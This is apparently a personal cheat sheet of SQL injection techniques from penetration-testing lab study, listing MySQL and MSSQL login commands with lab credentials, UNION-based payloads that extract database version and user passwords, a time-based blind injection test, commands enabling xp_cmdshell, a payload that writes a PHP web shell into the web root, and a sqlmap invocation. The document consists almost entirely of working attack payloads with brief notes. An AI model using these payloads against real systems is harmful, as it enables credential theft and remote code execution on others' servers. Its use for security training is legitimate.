# SQL Entry point
- mysql ``` mysql -u root -p'root' -h 192.168.186.16 -P 3306```
- Interesting info

    ``` database(), user(), @@version
- mssql ``` impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth ```
    
    Get tables: ``` select * from {datatable}.information_schema.tables; ```

    ![alt text](image.png)

    example: ```table = offsec.dbo.users```

# Manual SQL exploit

## Union based payload
``` %' UNION SELECT database(), user(), @@version, null, null -- // ```

``` ' UNION SELECT null, username, password, description, null FROM users -- // ```

- Requires same number of columns & Usually first column union will be ignore (ID column)

## Blind SQL
- boolean/time-based checking

``` ' AND IF (1=1, sleep(3),'false') -- // ```
- test if something is exist : yes = do sleep 3 seconds

# SQL Shellcode excution
## Manual shell
- mssql shell

    ``` 
    EXECUTE sp_configure 'show advanced options', 1;

    EXECUTE sp_configure 'xp_cmdshell', 1;```

- mysql shell

    care about column number

    ```
    ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
    ```

## Automated 
- BANNED
- mysql
    ``` sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user ```


